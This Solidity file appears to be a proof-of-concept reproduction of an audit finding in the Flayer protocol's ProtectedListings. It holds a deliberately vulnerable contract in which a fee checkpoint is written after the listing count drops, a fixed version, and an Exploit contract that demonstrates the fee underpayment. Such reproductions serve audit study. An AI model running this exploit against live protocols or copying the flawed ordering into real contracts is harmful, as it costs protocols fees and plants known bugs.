// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Flayer — H-7 (Sherlock 2024-08, issue 243)
    ProtectedListings.unlockProtectedListing decreases listingCount and only
    then writes the utilization checkpoint. The next protected unlock prices
    fees off that lower count, so the same duration is cheaper.
    Two listings: first fee 0.402 ether, second fee 0.401 ether.
    The caller keeps 0.001 ether that the checkpoint should have charged.
*/

contract CollectionToken {
    string public symbol = "FL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function burnFrom(address from, uint256 amount) external {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract ProtectedListings {
    struct ProtectedListing {
        address owner;
        uint96 tokenTaken;
    }

    CollectionToken public immutable collectionToken;
    uint256 public listingCount;
    uint256 public checkpointCount;
    uint256 public feesTaken;
    mapping(uint256 => ProtectedListing) public protectedListings;
    uint256 public constant BASE = 0.4 ether;
    uint256 public constant PER_LISTING = 0.001 ether;

    constructor(CollectionToken token) {
        collectionToken = token;
    }

    function createTwo(address owner) external {
        listingCount = 2;
        checkpointCount = 2;
        protectedListings[0] = ProtectedListing(owner, uint96(0.4 ether));
        protectedListings[1] = ProtectedListing(owner, uint96(0.4 ether));
    }

    function unlockPrice(address, uint256) public view returns (uint256) {
        return BASE + checkpointCount * PER_LISTING;
    }

    function unlockProtectedListing(address _collection, uint256 _tokenId, bool) public returns (uint256 fee) {
        ProtectedListing memory listing = protectedListings[_tokenId];
        if (listing.owner != msg.sender) revert("CallerIsNotOwner");
        fee = unlockPrice(_collection, _tokenId);
        collectionToken.burnFrom(msg.sender, fee);
        feesTaken += fee;
        delete protectedListings[_tokenId];
        listingCount = this.dropAndCheckpoint(listingCount);
    }

    function dropAndCheckpoint(uint256 count) external returns (uint256 next) {
        // @> VULN: checkpointCount is stored as count - 1, the listing count after this unlock
        require(msg.sender == address(this), "self");
        next = count - 1;
        checkpointCount = next;
    }
}

contract ProtectedListingsFixed {
    struct ProtectedListing {
        address owner;
        uint96 tokenTaken;
    }

    CollectionToken public immutable collectionToken;
    uint256 public listingCount;
    uint256 public checkpointCount;
    uint256 public feesTaken;
    mapping(uint256 => ProtectedListing) public protectedListings;
    uint256 public constant BASE = 0.4 ether;
    uint256 public constant PER_LISTING = 0.001 ether;

    constructor(CollectionToken token) {
        collectionToken = token;
    }

    function createTwo(address owner) external {
        listingCount = 2;
        checkpointCount = 2;
        protectedListings[0] = ProtectedListing(owner, uint96(0.4 ether));
        protectedListings[1] = ProtectedListing(owner, uint96(0.4 ether));
    }

    function unlockPrice(address, uint256) public view returns (uint256) {
        return BASE + checkpointCount * PER_LISTING;
    }

    function unlockProtectedListing(address _collection, uint256 _tokenId, bool) public returns (uint256 fee) {
        ProtectedListing memory listing = protectedListings[_tokenId];
        if (listing.owner != msg.sender) revert("CallerIsNotOwner");
        fee = unlockPrice(_collection, _tokenId);
        collectionToken.burnFrom(msg.sender, fee);
        feesTaken += fee;
        delete protectedListings[_tokenId];
        _createCheckpoint(_collection);
        unchecked {
            --listingCount;
        }
    }

    function _createCheckpoint(address) internal {
        checkpointCount = listingCount;
    }
}

contract Exploit {
    CollectionToken public token;
    ProtectedListings public listings;
    uint256 public fee0;
    uint256 public fee1;
    uint256 public kept;

    constructor() {
        token = new CollectionToken();
        listings = new ProtectedListings(token);
    }

    function run() external {
        listings.createTwo(address(this));
        uint256 fair = 0.804 ether;
        token.mint(address(this), fair);
        token.approve(address(listings), fair);
        fee0 = listings.unlockProtectedListing(address(0), 0, true);
        fee1 = listings.unlockProtectedListing(address(0), 1, true);
        kept = token.balanceOf(address(this));
        require(fee0 == 0.402 ether, "first fee");
        require(fee1 == 0.401 ether, "second fee");
        require(fee1 < fee0, "no discount");
        require(kept == 0.001 ether, "savings");
        require(listings.feesTaken() == 0.803 ether, "protocol short");
    }
}
